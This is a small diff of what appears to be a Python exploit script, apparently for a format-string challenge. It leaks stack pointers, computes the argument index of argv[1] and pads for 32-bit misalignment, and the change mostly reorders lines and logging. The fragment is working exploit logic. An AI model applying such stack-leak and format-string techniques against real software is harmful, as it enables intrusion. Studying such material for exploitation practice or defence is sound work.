@@ -71,15 +71,13 @@ log.info('sp_vuln: %08x', sp_vuln)
 sp_main = sp_vuln + 0x18 + 4 + 4
 sp_main_off = sp_main - sp_vuln
 argv1 = leak_ptr_at(sp_main_off)
-log.info('argv1: %08x', argv1)
-
-# Find exact offset of the user argument
 argv1_off = argv1 - sp_vuln
-argv1_idx = argv1_off >> 2
+log.info('argv1: %08x (+%d)', argv1, argv1_off)
 
 # We might miss the start of the string due to a 32-bit misalign (arg indices
 # assume 32-bit steps), so we need to offset our target address and adjust the
 # index
+argv1_idx = argv1_off >> 2
 missby = argv1_off - argv1_idx * 4
 padding = 4 - missby
 n_idx = argv1_idx + 1
